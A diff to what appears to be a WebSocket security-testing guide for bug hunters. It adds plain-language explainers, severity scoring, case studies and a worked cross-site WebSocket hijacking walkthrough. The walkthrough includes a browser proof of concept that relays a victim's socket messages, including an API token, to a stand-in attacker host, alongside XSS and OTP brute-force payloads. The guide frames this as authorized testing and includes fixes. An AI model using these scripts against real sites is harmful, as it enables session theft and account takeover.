@@ -56,11 +56,13 @@
 19. [Building a Professional PoC](#19-building-a-professional-poc)
 20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
 21. [Automation & Red-Team Notes](#21-automation--red-team-notes)
+22. [Real-World Case Studies (Verified)](#22-real-world-case-studies-verified)
 
 **Appendices**
 - [Appendix A — WebSocket Workflow Cheat Sheet](#appendix-a--websocket-workflow-cheat-sheet)
 - [Appendix B — WebSocket Decision Tree](#appendix-b--websocket-decision-tree)
 - [Appendix C — Important Links](#appendix-c--important-links)
+- [Appendix D — Worked End-to-End Transcript (CSWSH → data theft / ATO)](#appendix-d--worked-end-to-end-transcript-cswsh--data-theft--ato)
 
 ---
 
@@ -121,6 +123,8 @@ wscat -c 'wss://target.com/ws' -H 'Origin: https://evil.example'
 # 2. WebSocket Anatomy — Handshake, Frames & the Trust Model
 
 ## 2.0 WebSockets in 3 minutes (read this if WS is new)
+> 🔰 **In plain words — the anchor for this whole kit.** Ordinary HTTP is like **mailing letters**: you send one, you get one back, done. A **WebSocket is an always-open phone call** between the page and the server — either side can talk any time (chat, live prices, notifications). Three facts about that phone call are the entire kit. **(1)** You place the call with a normal HTTP request (the "handshake"), and the browser **auto-attaches your ID badge (cookies)** to it — just like every other request to that site. **(2)** The one guard that normally stops other websites reading your data (CORS/Same-Origin Policy) **does not apply to phone calls** — *any* website can make your browser dial *any* number. The *only* thing that can stop a stranger's site from dialing on your behalf is the callee checking the **"where are you calling from" stamp (the `Origin` header)** — and lots of servers never check it. That's **CSWSH**: an evil page makes your browser dial the target *as you*, and because nobody checks the Origin stamp, the target picks up and has a live two-way conversation with the attacker — who hears **both** sides (reads the replies). It's CSRF that *also lets you read the responses*. **(3)** Once the call connects, everything said down the line is usually trusted forever — the server checks your badge when you *dial*, but rarely re-checks it for each *sentence* (so you can ask for someone else's data = IDOR), and whatever you say gets acted on by the backend (so a message field is an injection sink). The whole kit: **read the handshake to see if a stranger can dial as the victim, then treat every message as untrusted input to the backend.**
+
 A WebSocket gives a page a **persistent, two-way (full-duplex) connection** to a server — instead of request/response, both sides push **messages** any time. It's how chat, live prices, notifications, and collaborative apps work.
 - **It starts as HTTP.** The browser sends a normal `GET` with `Upgrade: websocket` (the "handshake"); the server replies `101 Switching Protocols`; after that the same TCP connection carries **frames** (text or binary messages), not HTTP.
 - **In JS it's one line:** `var ws = new WebSocket('wss://target.com/ws'); ws.onmessage = e => ...; ws.send('{"type":"hello"}')`.
@@ -204,6 +208,8 @@ This phase decides which attacks are even possible.
 
 **The flagship WebSocket bug.** CSWSH = **CSRF on a WebSocket, with the bonus that you can read the responses.**
 
+> **In plain words:** an evil website makes the victim's browser **dial the target's phone line while carrying the victim's badge** — and because the target never checks the "where are you calling from" stamp (`Origin`), it answers *as if the victim called* and holds a live two-way conversation with the attacker's script. That script can both **ask for the victim's private data and hear the answers**, and **give orders as the victim**. Three things must all be true for it to work: the call is authenticated by a **cookie** (auto-dialed, not a token the attacker can't know), the server **doesn't check the Origin stamp**, and the cookie actually rides on a cross-site call (`SameSite=None` or same-site). If auth is a token the page's JavaScript has to type in, the stranger can't type it → no CSWSH.
+
 **5.1 The conditions (ALL must hold).** **IF** (a) the WS authenticates via a **cookie** the browser auto-sends, **AND** (b) the server **does not validate the `Origin`** header at the handshake, **AND** (c) the cookie is sent cross-site (SameSite=None, or same-site position) → **THEN** any attacker page can open the socket **as the victim** and read/send messages. (CWE-1385 *Missing Origin Validation in WebSockets*.)
 
 **5.2 Test Origin handling (and bypasses).** From `websocat`/`wscat`, send the handshake with the victim cookie and vary `Origin`:
@@ -216,6 +222,8 @@ This phase decides which attacks are even possible.
 **5.4 The validity gate.** A real CSWSH must fire in a **default browser, cross-site**: an attacker HTML page (`new WebSocket('wss://target/ws')`) that the logged-in victim opens connects and exfiltrates a message to the attacker. **IF** the WS auth is a **token the JS must add** (URL/subprotocol/first-message) that the attacker can't know → CSWSH does **not** work; don't report it (§15, §16).
 
 # 6. Authentication & Authorization over WebSockets
+
+> **In plain words:** the server checks your badge when you *dial*, but almost never re-checks it for each *sentence* you speak on the call. So once you're connected — even on your own low-privilege account — you can say "read me conversation #124" or "place this order on account #B," and the backend just does it, because it stopped asking "is this yours?" after the call connected. Swapping someone else's id into a message is **IDOR over WebSocket**; invoking a privileged message type is **BFLA**. Prove it the IDOR way: two accounts, ask down A's call for B's data, get B's data back.
 
 **6.1 Auth only at the handshake (never per message).** The connection is authenticated once and then trusted. Combine with §5 (if you can hijack/forge the connection) or with a low-priv account: once connected, **what can you send?**
 
@@ -247,6 +255,8 @@ This phase decides which attacks are even possible.
 
 # 8. Message Tampering → Injection
 
+> **In plain words:** the phone line is just a **tunnel to the backend** — whatever you say down it lands in a database query, a shell command, an outbound request, or another user's screen. And here's the catch that makes it pay: the careful input-cleaning the app does on its normal HTTP forms is *frequently missing on the message handlers*, because developers forget the socket is an input too. So re-run **every** injection you know — XSS (a chat message rendered in someone else's browser), SQLi/NoSQLi (a search field into a query), command injection/SSRF (a field that runs a tool or fetches a URL), path traversal — against each message field. Same payloads as HTTP, a door that's often left unlocked.
+
 After the handshake it's just frames — **apply every injection class to every message field** (Burp: intercept/edit a frame, or resend an edited copy). The message handler usually skips the validation the HTTP layer did.
 
 **8.1 XSS (stored/reflected) via messages.** In chat/comment/notification apps, a message you send is **rendered in other users' DOM**. Send `<img src=x onerror=alert(document.domain)>` / `<svg onload=...>` in a chat frame → if it executes in a recipient's browser → **stored XSS over WebSocket** (often missed because it's not an HTTP form). Chain to session/ATO via the XSS kit.
@@ -271,6 +281,8 @@ Turn the §5 hijack into impact. From the **attacker's** page (running in the vi
 **9.4 Scope it.** State which messages you could send/read and the worst outcome (full inbox theft, ATO, admin action). That's what sets severity (§17).
 
 # 10. Rate-Limit / Brute-Force / Anti-Automation Bypass over WS
+
+> **In plain words:** the guard who counts "too many login tries" usually watches the *front door* (HTTP requests) — and doesn't realize there's a *phone line* into the same room. A login/OTP/coupon check that blocks you after 5 HTTP attempts often accepts *thousands* of the same attempts sent as WebSocket messages on one open call. Fire many `{"verifyOtp":"0001"}` frames down the line → brute the code → account takeover, all on a single connection that barely shows up in the logs.
 
 **10.1 HTTP limits don't cover WS messages.** A login/OTP/coupon endpoint that's rate-limited over HTTP is frequently **unlimited over the WebSocket** message channel. Send many `{"type":"verifyOtp","code":"0001"}` frames on one socket → brute the code → **ATO**.
 **10.2 One socket, many messages.** No per-message throttle = high-rate brute with one connection and one log line. Confirm by counting accepted attempts vs the documented cap.
@@ -338,12 +350,14 @@ Every WebSocket finding has a "now do Y."
 
 # 17. Severity Calibration — how triagers rate WebSocket bugs
 
+> **In plain words:** severity comes down to two questions — **what can this phone line read, and what can it do?** — times **who can be the victim.** A message field that tunnels to a shell or the database (RCE / full dump) is Critical. A cross-site hijack that reads the victim's private data *and* changes their account (CSWSH → ATO) is High–Critical (it's `UI:R` because the victim has to open the attacker's page, like CSRF, but scores higher because it also *reads the replies*). A chat message that becomes stored XSS, or an IDOR that reads other users' data, is High. Cleartext `ws://` or a token in the URL with nothing sensitive on it is Medium. And "no Origin check" when auth is a token the attacker can't supply is **not a finding** — lead with the highest impact you actually proved.
+
 **CWE:** **CWE-1385** (Missing Origin Validation in WebSockets → CSWSH), **CWE-346** (Origin Validation Error), **CWE-352** (CSRF, related to CSWSH), **CWE-319** (cleartext `ws://`), **CWE-598/200** (token in URL / info exposure), **CWE-306/862/285** (missing authn/authz over WS), plus the **injection CWEs** (79/89/943/77/78/918/22) and **CWE-770/400** (DoS).
 
 | Scenario | Typical severity | CVSS 3.1 (example) |
 |---|---|---|
 | **Message injection → RCE / full DB dump** | **Critical** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (~9.x) |
-| **CSWSH → ATO / full private-data theft** | **High/Critical** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (~8; UI:R = victim opens the page) |
+| **CSWSH → ATO / full private-data theft** | **High/Critical** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = **9.3 Critical** when it reaches ATO (I:H); data-theft-**only** (I:L) ≈ **8.2 High**. `UI:R` = victim opens the page; `S:C` = it crosses into the victim's account/authority |
 | **Stored XSS via chat message → session theft** | **High** | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
 | **IDOR / BFLA over WS (cross-user read/action)** | **High/Medium** | per data sensitivity (IDOR kit §21) |
 | **Rate-limit bypass over WS → OTP/credential brute → ATO** | **High** | `…/C:H/I:H` |
@@ -411,6 +425,29 @@ websocat -H='Origin: https://evil.example' -H='Cookie: session=<victim>' 'wss://
 
 ---
 
+# 22. Real-World Case Studies (Verified)
+
+> WebSockets break two assumptions developers carry over from HTTP: (1) "the browser's same-origin policy protects my authenticated endpoint" — it does **not** protect the WS handshake the way it protects `fetch`; and (2) "internal/LAN means unreachable" — a browser can be turned into a proxy into the LAN. These are documented, attributed facts; each maps to a technique in this guide. (Verify-before-write: every claim checked against primary sources, cited inline.)
+
+**① CSWSH — the class-defining bug (Christian Schneider, 2013). Why a WS handshake is a CSRF surface.**
+**Christian Schneider coined "Cross-Site WebSocket Hijacking" on 31 August 2013.** The root cause (this guide's §5): the WebSocket **handshake is an ordinary HTTP request that carries cookies**, but unlike `fetch`/XHR it is **not covered by CORS/SOP restrictions on reading the response** — so if the server authenticates the handshake **solely with a cookie** and checks **no CSRF token and no `Origin` header**, an attacker's page (`evil.com`) can open `new WebSocket("wss://victim/…")`, the browser attaches the victim's session cookie, and the socket connects **in the victim's authenticated context**. The attacker's JavaScript can then **send arbitrary messages and read every message the server sends back** — full read/write access to the victim's session over the socket. It is CSRF, but *bidirectional and persistent*.
+→ *Technique:* §5 (Origin/CSWSH) → §9 (CSWSH → impact). *Lesson:* a cookie-authenticated WS handshake with no Origin check and no CSRF token is CSWSH.
+*Source:* [Christian Schneider — Cross-Site WebSocket Hijacking (CSWSH)](https://christian-schneider.net/blog/cross-site-websocket-hijacking/) · [PortSwigger — Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
+
+**② CSWSH → account takeover / data theft — why it's Critical, not "CSRF-lite" (PortSwigger).**
+The reason CSWSH pays is what the socket *carries*. In real apps the WS stream is the **chat history, notifications, live order/wallet feed, collaborative-document contents, or the account's own data** — and many apps will happily send a **session token, password-reset link, or API key** down the socket on connect or on request. So a CSWSH PoC that opens the socket from the attacker's page and **exfiltrates the first messages** frequently yields **full account data → ATO**: read the victim's messages/tokens, or **send** state-changing messages (transfer, change email, post as the victim). PortSwigger's Web Security Academy demonstrates exactly this — CSWSH used to read a victim's chat history and steal credentials.
+→ *Technique:* §9 (CSWSH → ATO/data theft/state change), §7 (tokens over WS). *Lesson:* score CSWSH by what streams over the socket — it's usually the whole session.
+*Source:* [PortSwigger — Cross-site WebSocket hijacking (topic + labs)](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
+
+**③ DNS rebinding → local/unauthenticated WS & HTTP services (Brannon Dorsey, 2018). "Origin/LAN isn't auth."**
+Brannon Dorsey's 2018 research, **"Attacking Private Networks from the Internet with DNS Rebinding,"** turned a victim's **browser into a proxy into their LAN**: a malicious site rebinds its DNS to a private IP, and the browser then talks to local services on `127.0.0.1`/`192.168.x.x`. He demonstrated control of unauthenticated local APIs on **Google Home/Chromecast, Sonos, Roku, and smart thermostats** (restart devices, map the home network, change settings) — the vendors shipped patches. The WebSocket lesson is direct: local and internal WS/HTTP servers that trust **network position or the `Origin` header** as authentication are reachable cross-origin via rebinding, because DNS rebinding defeats the same-origin assumption. **Origin is a hint, not an authenticator** (this guide's §5/§7).
+→ *Technique:* §5 (Origin is not auth), §12 (local/internal WS exposure). *Lesson:* never treat `Origin` or "it's only on localhost/LAN" as an access control.
+*Source:* [Brannon Dorsey — Attacking Private Networks from the Internet with DNS Rebinding](https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325) · [CSO Online — DNS rebinding pwns Google Home, Sonos, Roku](https://www.csoonline.com/article/565684/decade-old-attack-can-pwn-google-home-chromecast-sonos-and-roku.html)
+
+**④ The meta-lesson.** WebSocket bugs cluster in two families the guide keeps hammering: **the handshake** (CSWSH, missing per-message authz, tokens in the URL) and **the message layer** (the frames are an *untrusted input channel* — the same XSS/SQLi/NoSQLi/cmdi/IDOR you test over HTTP, but often **past the WAF and out of the request logs**, because security appliances frequently don't inspect WS frames). So the two questions to ask on every WebSocket are Schneider's and the injection tester's together: *who is allowed to open this socket (Origin/CSRF/authz), and is every message re-validated server-side like any other user input?*
+
+---
+
 # Appendix A — WebSocket Workflow Cheat Sheet
 
 ```
@@ -464,5 +501,84 @@ Then: severity by what the socket can READ + DO; PoC; report.
 
 **Related kits here:**
 - **CSRF** (the cookie/SameSite gate) · **CORS** (Origin allow-list bypasses) · **IDOR** (two-account proof) · **XSS** (escalate stored-XSS via chat) · **GraphQL** (`API/GraphQL/` §15.5 subscriptions/CSWSH) · **Request Smuggling** (upgrade smuggling).
+
+---
+
+# Appendix D — Worked End-to-End Transcript (CSWSH → data theft / ATO)
+
+> **What this shows.** The whole spine in one run — the [Master Testing Sequence](#master-testing-sequence--the-testing-order) in motion — on a fictional chat app `https://chat.example`. It walks the WebSocket-defining bug (§5/§9, §22 ①): the handshake authenticates on a **cookie alone** with **no `Origin` check and no CSRF token**, so an attacker page opens the socket **in the victim's session** and **reads their private data** off the stream → account takeover. Every step is benign (own test accounts, exfil to your own listener). Placeholders are benign; run only on an authorized target.
+
+**Step 1 — recon: find the WS endpoint + capture the handshake (§3).** DevTools → Network → WS, or grep the JS for `new WebSocket(`:
+
+```
+$ # from the app's JS:  new WebSocket("wss://chat.example/ws?...")
+$ # capture the upgrade request (Burp WebSockets history / DevTools):
+GET /ws HTTP/1.1
+Host: chat.example
+Upgrade: websocket
+Connection: Upgrade
+Origin: https://chat.example
+Cookie: session=<victim-session>            ← auth is a COOKIE
+Sec-WebSocket-Key: ...
+   → 101 Switching Protocols                 ← handshake accepted
+```
+
+**Step 2 — baseline the auth model + map messages (§4).** Two questions decide everything: *what authenticates the handshake, and is the `Origin` validated?*
+
+```
+# after connect, the server streams the session's data:
+→ {"type":"history","messages":[{"from":"alice","text":"..."}]}
+→ {"type":"whoami","user":"alice@chat.example","apiToken":"sk_live_..."}   ← the socket hands out the token! (§7)
+# send a benign probe:
+← {"type":"ping"}   → {"type":"pong"}
+```
+
+**Step 3 — the CSWSH test: does the handshake accept a foreign `Origin`? (§5 — the validity gate).** Replay the handshake with an attacker `Origin` and the victim cookie:
+
+```
+$ websocat -H='Origin: https://evil.com' --header="Cookie: session=<victim-session>" wss://chat.example/ws
+   → 101 Switching Protocols                 ← ACCEPTED from a foreign Origin. No Origin check, no CSRF token = CSWSH.
+→ {"type":"history","messages":[...]}        ← it streams the victim's private data to a cross-site connection
+```
+
+> **Validity gate (§5/§15).** `websocat` with a foreign `Origin` proves the *server* accepts it, but the real finding needs the **browser** to attach the cookie automatically (that's what makes it exploitable without stealing the cookie). Confirm in a real browser (Step 4) before reporting — a server that ignores `Origin` is only CSWSH if the browser will send the cookie cross-site (i.e., `SameSite` isn't `Strict`/`Lax`-blocking the WS).
+
+**Step 4 — weaponize: attacker page opens the socket in the victim's session (§9).** Host this on `evil.com`; when the logged-in victim visits, their browser attaches the `chat.example` cookie:
+
+```
+<script>
+  var ws = new WebSocket("wss://chat.example/ws");          // browser attaches victim's session cookie automatically
+  ws.onmessage = function(e){                                 // read everything the server streams to the victim
+    fetch("https://attacker-oob.example/x?d=" + encodeURIComponent(e.data));   // exfil to YOUR listener
+  };
+  ws.onopen = function(){ ws.send('{"type":"getProfile"}'); } // and SEND as the victim (state change)
+</script>
+```
+
+```
+# attacker-oob listener receives:
+GET /x?d={"type":"whoami","user":"alice@chat.example","apiToken":"sk_live_..."}   ← victim's token, cross-site. ATO.
+GET /x?d={"type":"history","messages":[...]}                                       ← victim's private chat history.
+```
+
+**Step 5 — the impact, then STOP (§9/§17).** The socket streamed the victim's `apiToken` to the attacker's origin → **account takeover**; the `ws.send` shows **state change as the victim**. One benign exfil to your own listener, using your own victim test account, is the whole Critical — don't touch real users.
+
+**Step 6 — report the impact (§20).** Lead with ATO, show the chain:
+
+```
+Title:  Cross-Site WebSocket Hijacking on /ws → victim data theft & account takeover
+Chain:  handshake authenticates on session COOKIE only, no Origin validation, no CSRF token →
+        attacker page (evil.com) opens wss://chat.example/ws → browser attaches victim cookie →
+        socket streams victim's history + apiToken to attacker's origin → ATO; ws.send = actions as victim.
+Impact: any logged-in user who views the attacker page has their session data (incl. API token) stolen and can be
+        acted upon as themselves (Critical, CWE-1385/CWE-352 + CWE-200).
+Proof:  browser PoC + OOB listener log (own test account); websocat foreign-Origin handshake acceptance.
+Fix:    validate the Origin header on the handshake AND add a CSRF token / unpredictable value; scope cookies
+        SameSite=Strict for the WS path; never stream secrets (apiToken) on connect.
+```
+
+That is a full WebSocket run: **§3 recon → §4 baseline auth model → §5 CSWSH validity gate → §9 browser weaponization → §17 impact → §20 report.** A missing `Origin` check became account takeover — the exact Schneider-2013 bug (§22 ①/②), proven benignly against your own test account. (If the handshake *had* validated Origin: pivot to per-message **authz/IDOR** (§6) and **message-layer injection** (§8) — the other half of the WS attack surface.)
+
+---
 
 > **Authorized testing only.** CSWSH PoCs exfiltrate to **your** server using **your** victim test account; prove cross-site in a real browser; two own accounts for IDOR; measured counts for brute; measure-don't-flood for DoS; revert state. Report **impact** (data theft, ATO, RCE, XSS, cross-user) — not "no Origin check."
